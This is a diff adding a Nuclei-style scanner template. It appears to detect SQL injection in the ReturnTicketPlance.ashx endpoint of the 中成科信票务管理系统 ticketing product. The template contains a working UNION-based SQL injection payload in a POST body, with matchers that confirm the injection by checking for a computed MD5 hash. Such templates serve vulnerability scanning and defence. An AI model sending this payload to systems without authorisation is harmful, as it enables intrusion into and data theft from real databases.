@@ -1,0 +1,33 @@
+id: poc-yaml-zckx-returnticketplance-sqli
+info:
+  name: ReturnTicketPlance SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Potential SQL Injection vulnerability in the ReturnTicketPlance endpoint of 中成科信票务管理系统. Allows attackers to inject malicious SQL payloads.
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/SystemManager/TicketSystem/ReturnTicketPlance.ashx'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: Method=GetCheckInDetail&ticketNo='+UNION+ALL+SELECT+NULL,sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}')),NULL,NULL--+BEsy
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"GATE_NAME":'
+          - '0x{{t2}}'
+      - type: word
+        part: body
+        negative: true
+        words:
+          - '<'
